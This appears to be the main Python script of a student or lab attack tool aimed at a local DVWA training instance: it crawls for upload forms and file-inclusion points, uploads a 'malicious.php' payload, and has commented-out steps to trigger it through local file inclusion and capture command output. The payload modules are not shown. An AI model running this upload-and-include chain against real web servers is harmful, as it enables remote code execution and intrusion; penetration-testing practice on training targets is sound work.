from argparse import ArgumentParser
from sys import exit
import requests
from bs4 import BeautifulSoup
import urllib.parse
import crawler
import lfi
import uploadv2


URL = "http://localhost/DVWA/" #"http://192.168.52.129/DVWA/"
#UPLOAD_DIR = f"{URL}hackable/uploads/"
UPLOAD_DIR_WORDLIST = "upload_dir_wordlist.txt"
WORDLIST = "wordlists/test"
COOKIE = {
    'PHPSESSID': 'hello',
    'security': 'medium'
}

PAYLOAD_FILENAME = "malicious.php"
REPORT_FILENAME = "vuln_report.txt"


def generate_report(uploaded_url, lfi_url, command_results):
    report = "Vulnerability Report\n"
    report += "====================\n"
    if uploaded_url:
        report += f"\nFile Upload Vulnerability:\nDirect URL: {uploaded_url}\n"
    if lfi_url:
        report += f"\nLFI Vulnerability Exploit URL:\n{lfi_url}\n"
    if command_results:
        report += "\nCommand Execution Results:\n"
        report += command_results
    with open(REPORT_FILENAME, "w") as f:
        f.write(report)
    print(f"[+] Report generated: {REPORT_FILENAME}")

def main():
    session = requests.Session()
    
    # Main function
    found_urls, uploadable_urls = crawler.main_crawl(URL, WORDLIST, COOKIE)
    print("Crawling complete.")

    found_urls = crawler.clean_found_urls(URL, found_urls)

    print("Found URLs:")
    for url in found_urls:
        print("[+] " + url)
    print("\nUploadable URLs:")
    for url in uploadable_urls:
        print("[+] " + url)
    print("\nPotential LFI vulnerabilities:")
    lfi_targets = crawler.check_lfi(found_urls)

     # Generate the payloads
    payload_filenames = uploadv2.create_payloads()

    # Use dynamic wordlists to determine endpoints:
    # dynamic_upload_url = uploadv2.try_upload_url(args.url, args.upload_url_wordlist, COOKIE, PAYLOAD_FILENAME)
    # if dynamic_upload_url is None:
    #     print("[-] No valid upload URL found. Exiting.")
    #     exit(1)

    for url in uploadable_urls:
        if uploadv2.upload_file(url, PAYLOAD_FILENAME, COOKIE):
            print(f"[+] File upload Success. URL: {url}.")

    
    dynamic_upload_dir = uploadv2.get_upload_directory(URL, UPLOAD_DIR_WORDLIST, PAYLOAD_FILENAME, COOKIE)
    # print(f"Dynamic Upload URL: {dynamic_upload_url}")
    print(f"Dynamic Upload Directory: {dynamic_upload_dir}")

    # # Upload the payload using the dynamic endpoint
    # if not uploadv2.upload_file(dynamic_upload_url, PAYLOAD_FILENAME, COOKIE):
    #     print("[-] File upload failed. Exiting.")
    #     exit(1)
    # direct_file_url = dynamic_upload_dir + PAYLOAD_FILENAME
    # print(f"[+] Direct file URL (if accessible): {direct_file_url}")

    # # --- LFI Brute Force and Trigger Phase ---
    # payload_relative = dynamic_upload_dir + PAYLOAD_FILENAME  # full URL for the file (from base)
    # lfi_found_url = None
    # for target in lfi_targets:
    #     lfi_found_url = lfi.brute_force_lfi(target, payload_relative, session, COOKIE)
    #     if lfi_found_url:
    #         break

    # # --- Trigger Payload Phase ---
    # if lfi_found_url:
    #     command_results = lfi.trigger_payload_via_lfi(lfi_found_url, COOKIE)
    # else:
    #     print("[-] Could not locate the uploaded file via LFI.")
    #     command_results = ""

    # # --- Report Generation ---
    # generate_report(direct_file_url, lfi_found_url, command_results)
    

if __name__ == "__main__":
    main()
